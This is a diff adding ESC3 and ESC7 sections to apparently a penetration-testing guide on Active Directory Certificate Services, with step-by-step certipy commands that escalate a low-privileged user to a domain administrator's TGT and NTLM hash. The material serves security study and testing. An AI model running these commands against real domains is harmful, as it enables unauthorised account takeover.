@@ -90,6 +90,58 @@ certipy auth -pfx <Certificate.pfx> -user <TargetUser> -dc-ip <DC-IP>
 
 After that, we receive a `TGT` and the user's `NTLM` hash.
 
+### ESC3 (Enrollment Agent Certificate)
+
+The ESC3 attack abuses a certificate template that grants the **Certificate Request Agent** EKU (OID `1.3.6.1.4.1.311.20.2.1`). A certificate carrying this EKU turns its holder into an *enrollment agent*, an identity that Active Directory trusts to request certificates **on behalf of** other users. If a low-privileged user is allowed to enroll in such a template, they can obtain the agent certificate and then use it to request a client-authentication certificate for any user, such as a domain administrator, and authenticate as that user.
+
+Unlike ESC1, the attacker never supplies an arbitrary SAN. The privilege comes from the second request being *signed by* an enrollment agent, which the CA accepts as authorization to enroll for someone else.
+
+#### ESC3 Requirements
+
+The attack chains two templates:
+
+- **Agent template**: a template with the `Certificate Request Agent` EKU that the attacker is allowed to enroll in. This yields the enrollment agent certificate.
+- **Target template**: a template that has a client authentication EKU (for example the default `User` template), that the intended victim can enroll in, and where the CA and template do **not** restrict which enrollment agents may act or for which users (no enrollment-agent restrictions, and `Authorized Signatures Required` satisfied by a single Certificate Request Agent signature).
+
+#### ESC3 Exploitation
+
+1. **Enumerate** (certipy flags the template with `ESC3` and the `Certificate Request Agent` EKU)
+
+    ```bash
+    certipy find -u 'user@domain' -p 'password' -dc-ip <DC-IP> -vulnerable -stdout
+    ```
+
+2. **Request the enrollment agent certificate** from the agent template
+
+    ```bash
+    certipy req \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -target 'CA.domain' \
+        -ca 'Domain-CA' -template 'EnrollmentAgentTemplate'
+    ```
+
+    This writes an agent `.pfx` belonging to our user.
+
+3. **Request a certificate on behalf of a privileged user**, signing the request with the agent certificate
+
+    ```bash
+    certipy req \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -target 'CA.domain' \
+        -ca 'Domain-CA' -template 'User' \
+        -pfx 'agent.pfx' -on-behalf-of 'DOMAIN\administrator'
+    ```
+    > `-on-behalf-of` takes the `NETBIOS\user` form of the target. The `-pfx` is the agent certificate from step 2, which is what supplies the Certificate Request Agent signature.
+    {: .prompt-info}
+
+4. **Authenticate with the resulting certificate**
+
+    ```bash
+    certipy auth -pfx 'administrator.pfx' -dc-ip <DC-IP>
+    ```
+
+    We receive the target's `TGT` and `NTLM` hash.
+
 ### ESC4 (Template Hijacking)
 Occurs when we have permission to modify a certificate template, allowing us to add a new template or modify an existing one. This can lead to the issuance of certificates for any user or computer account in the domain.
 
@@ -136,6 +188,81 @@ If a user has `FullControl, WriteDacl, WriteOwner` or write property rights on a
         -pfx <Certificate.pfx> \
         -dc-ip <DC-IP>
     ```
+
+### ESC7 (Vulnerable CA Access Control)
+
+ESC7 is a misconfiguration on the **CA itself** rather than on a template. Two CA access rights matter:
+
+- **ManageCA** (CA Administrator): can change CA configuration, enable disabled templates, add or remove certificate managers (officers), and toggle CA-wide flags such as `EDITF_ATTRIBUTESUBJECTALTNAME2` (which turns the CA into ESC6).
+- **ManageCertificates** (Certificate Manager / officer): can approve pending or denied certificate requests.
+
+Neither right, on its own, is "issue me a domain admin certificate". The attack is composing them: a principal holding only `ManageCA` first grants itself the officer role, then approves a request it was not allowed to enroll for. The canonical route uses the built-in `SubCA` template, which permits an arbitrary SAN but by default only Domain/Enterprise Admins can enroll, so our request is denied and then force-issued.
+
+#### ESC7 Requirements
+
+- `ManageCA` over the target CA (optionally `ManageCertificates` as well, which lets you skip the add-officer step).
+
+#### ESC7 Exploitation
+
+1. **Enumerate** (certipy flags the CA with `ESC7 : User has dangerous permissions`)
+
+    ```bash
+    certipy find -u 'user@domain' -p 'password' -dc-ip <DC-IP> -vulnerable -stdout
+    ```
+
+2. **Add yourself as an officer** (grants `ManageCertificates`)
+
+    ```bash
+    certipy ca \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -ca 'Domain-CA' \
+        -add-officer 'user'
+    ```
+
+3. **Enable the `SubCA` template** on the CA (it allows an arbitrary SAN)
+
+    ```bash
+    certipy ca \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -ca 'Domain-CA' \
+        -enable-template 'SubCA'
+    ```
+
+4. **Request a certificate for a privileged user via `SubCA`.** Enrollment is denied (we are not a Domain Admin), but certipy saves the request ID and the private key.
+
+    ```bash
+    certipy req \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -ca 'Domain-CA' -template 'SubCA' \
+        -upn 'administrator@domain' -sid '<ADMIN-SID>'
+    ```
+
+5. **Approve your own denied request** using the officer role from step 2
+
+    ```bash
+    certipy ca \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -ca 'Domain-CA' \
+        -issue-request <REQUEST-ID>
+    ```
+
+6. **Retrieve the now-issued certificate**, pairing it with the saved key
+
+    ```bash
+    certipy req \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -ca 'Domain-CA' \
+        -retrieve <REQUEST-ID>
+    ```
+
+7. **Authenticate with the certificate**
+
+    ```bash
+    certipy auth -pfx 'administrator.pfx' -dc-ip <DC-IP>
+    ```
+
+> If the CA's RPC and web-enrollment endpoints are filtered, certipy's `ca` and `req` management calls will time out. Add `-ldap-scheme ldap` to drive the CA operations over LDAP instead of the default DCOM/RPC transport.
+{: .prompt-tip}
 
 ### ESC16 (Security Extension Disabled on CA)
 
